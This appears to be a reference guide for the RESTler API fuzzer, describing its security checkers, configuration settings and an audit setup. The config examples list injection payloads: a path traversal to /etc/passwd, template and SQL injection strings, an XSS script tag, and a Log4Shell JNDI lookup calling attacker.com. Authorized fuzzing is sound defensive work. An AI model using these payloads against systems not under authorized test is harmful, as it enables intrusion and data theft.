# RESTler Checkers Reference

## Checker Configuration

Configure checkers in `engine_settings.json`:

```json
{
    "checkers": {
        "namespacerule": {
            "trigger_on_dynamic_objects": true,
            "trigger_objects": ["tenantID", "userID"]
        },
        "invaliddynamicobject": {
            "no_defaults": false,
            "invalid_objects": [
                "../../../etc/passwd",
                "{{7*7}}",
                "'OR 1=1--",
                "<script>alert(1)</script>",
                "${jndi:ldap://attacker.com/a}"
            ]
        },
        "invalidvalue": {
            "custom_dictionary": "/path/to/invalid_dict.json",
            "max_combinations": 100,
            "random_seed": 0
        }
    },
    "grammar_schema": "Compile/grammar.json",
    "custom_bug_codes": ["5*"],
    "custom_non_bug_codes": []
}
```

## Checker Details

### UseAfterFreeChecker (Default: Enabled)
- **Trigger**: After DELETE requests succeed
- **Process**: Resends request using the deleted resource ID
- **Bug condition**: 20x response for deleted resource
- **Security**: Resource lifecycle issues, zombie resources

### NamespaceRuleChecker (Default: Disabled — CRITICAL for security audits)
- **Trigger**: After sequences with consumed dynamic resources
- **Process**: Replays request with attacker (second user) credentials
- **Bug condition**: Unauthorized access succeeds
- **Security**: IDOR, authorization bypass, multi-tenant isolation
- **Config**: `trigger_objects` — strings triggering attacker credential replay
- **Requires**: Two sets of credentials in auth configuration

### ResourceHierarchyChecker (Default: Enabled)
- **Trigger**: After sequences with 2+ consumed resources (no DELETE)
- **Process**: Accesses child resource with alternate parent ID
- **Bug condition**: Child accessible from wrong parent
- **Security**: Broken object-level access control

### LeakageRuleChecker (Default: Enabled)
- **Trigger**: When resource creation fails (4xx response)
- **Process**: Tries to access the resource that failed creation
- **Bug condition**: Non-existent resource returns data
- **Security**: Information disclosure, data leakage

### InvalidDynamicObjectChecker (Default: Enabled)
- **Trigger**: After sequences with consumed dynamic resources
- **Process**: Replaces resource IDs with invalid/malicious values
- **Bug condition**: 500 error from invalid IDs
- **Default invalid patterns**: `?injected_query_string=123`, `/?/`, `??`, object repetition, `{}`
- **Custom patterns**: Add path traversal, injection, template payloads

### PayloadBodyChecker (Default: Enabled)
- **Trigger**: After requests with payload bodies
- **Process**: Mutates body (value replacement, format editing, type modification)
- **Bug condition**: 500 error from mutations
- **Requires**: `grammar_schema` set in engine settings
- **Security**: Deserialization, type confusion, input validation

### ExamplesChecker (Default: Enabled)
- **Trigger**: When new requests with spec examples are discovered
- **Process**: Sends one request per unique example
- **Bug condition**: 5xx error from documented example
- **Requires**: `grammar_schema` set in engine settings

### InvalidValueChecker (Default: Disabled, Experimental)
- **Process**: Fuzzes individual parameters with custom invalid value dictionaries
- **Bug condition**: 5xx from invalid parameter values
- **Config**: Requires `custom_dictionary` or `custom_value_generators`

## Custom Checkers

```json
{
    "custom_checkers": ["/path/to/my_checker.py"]
}
```

Custom checkers execute after all built-in checkers. Follow the pattern in `restler/checkers/` directory.

## CLI Enable/Disable

```bash
# Enable specific checkers (omit "Checker" suffix)
--enable_checkers UseAfterFree,NamespaceRule,InvalidDynamicObject

# Disable specific checkers
--disable_checkers LeakageRule,Examples
```

## Security Audit Recommended Configuration

For maximum security coverage:

```bash
$RESTLER fuzz-lean \
    --grammar_file Compile/grammar.py \
    --dictionary_file Compile/dict.json \
    --settings engine_settings.json \
    --enable_checkers namespacerule,invalidvalue \
    --no_ssl \
    --host $TARGET_HOST \
    --target_port $TARGET_PORT
```

With `engine_settings.json`:
```json
{
    "grammar_schema": "Compile/grammar.json",
    "checkers": {
        "namespacerule": {
            "trigger_on_dynamic_objects": true
        },
        "invaliddynamicobject": {
            "invalid_objects": [
                "../../../etc/passwd",
                "{{7*7}}",
                "'OR 1=1--",
                "null",
                "-1",
                "99999999"
            ]
        }
    },
    "custom_bug_codes": ["5*"]
}
```
